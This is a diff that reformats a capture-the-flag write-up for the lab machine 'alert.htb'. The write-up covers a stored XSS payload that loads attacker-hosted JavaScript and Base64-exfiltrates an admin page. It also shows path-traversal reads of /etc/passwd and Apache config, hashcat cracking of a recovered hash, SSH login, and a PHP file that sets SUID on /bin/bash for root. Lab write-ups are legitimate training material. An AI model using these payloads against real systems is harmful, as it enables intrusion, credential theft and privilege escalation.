@@ -60,11 +60,14 @@ When rendered, the pop-up script executes 0, confirming a Stored XSS vulnerabili
 **Data Exfiltration via XSS / LFI**
 Since the **Contact Us** form triggers an administrative bot to view submitted messages/links, we host a payload on our attacker machine (`pwn.js`) to exfiltrate the HTML source of the admin's page (`index.php?page=messages`):
 1) Payload submitted via Contact Us form:
-    ```
+
+   ```
     <script src="http://10.10.15.97/pwn.js"></script>
     ```
-2) Contents of `pwn.js` hosted on our HTTP server:
-     ```
+   
+3) Contents of `pwn.js` hosted on our HTTP server:
+
+   ```
      var req = new XMLHttpRequest();
     req.open('GET', 'http://alert.htb/index.php?page=messages', false);
     req.send();
@@ -73,15 +76,18 @@ Since the **Contact Us** form triggers an administrative bot to view submitted m
     exfil.open('GET', 'http://10.10.15.97/?b64=' + btoa(req.responseText), false);
     exfil.send();
      ```
-
+   
 We receive a Base64-encoded response. Upon decoding, we reveal the DOM rendered for the administrator:
+
 ```
 <div class="container">
 <h1>Messages</h1>
 <ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
 </div>
 ```
+
 Messages are loaded using the `file=` parameter in `messages.php`. We check for **Path Traversal / Local File Inclusion (LFI)** by modifying `pwn.js` to target `/etc/passwd`:
+
 ```
 var req = new XMLHttpRequest();
 req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../etc/passwd', false);
@@ -96,13 +102,16 @@ We successfully retrieve `/etc/passwd`, identifying two user accounts with inter
 
 ### Reading Configuration Files and Credentials
 Next, we inspect the Apache configuration file `/etc/apache2/sites-available/000-default.conf` using the LFI flaw:
+
 ```
 var req = new XMLHttpRequest();
 req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../etc/apache2/sites-available/000-default.conf', false);
 req.send();
 // ... exfiltration
 ```
+
 Relevant VHost configuration retrieved:
+
 ```
 <VirtualHost *:80>
     ServerName statistics.alert.htb
@@ -121,20 +130,25 @@ We then exfiltrate the `.htpasswd` file located at `/var/www/statistics.alert.ht
 
 ### Hash Cracking and SSH Access
 We save the hash locally and crack it using `hashcat`:
+
 ```
 hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt
 ```
+
 Cracked Credentials: `albert` : `manchesterunited`
 
 Using these credentials, we log in via SSH and capture `user.txt`:
+
 ```ssh albert@10.10.11.43```
 
 ## Privilege Escalation (Root Flag)
 ### Group and Permission Enumeration
 We check the group memberships for the user `albert`:
+
 ```# uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)```
 
 We search for files and directories associated with the `management` group:
+
 ```find / -group management 2>/dev/null```
 
 Discovered Paths:
@@ -143,15 +157,18 @@ Discovered Paths:
 
 ### Port Forwarding and Local Service Analysis
 Enumerating ports listening strictly on the local interface (`127.0.0.1`):
+
 ```ss -nltp```
 
 We observe an internal service bound to port `8080`. We forward this port to our local system using SSH (_Local Port Forwarding_):
+
 ```ssh albert@10.10.11.43 -L 8080:127.0.0.1:8080```
 
 Navigating to `http://localhost:8080` loads an internal website monitoring portal.
 
 ### Abusing Website-Monitor for SUID Bash
 Since we possess write permissions in the monitoring path (such as `/opt/website-monitor/monitors`), we create a PHP script that sets the SUID bit on `/bin/bash`:
+
 ```<?php system("chmod u+s /bin/bash"); ?>```
 
 When the internal service (running under `root` privileges) processes or executes this file, it sets the SUID bit on the bash executable.
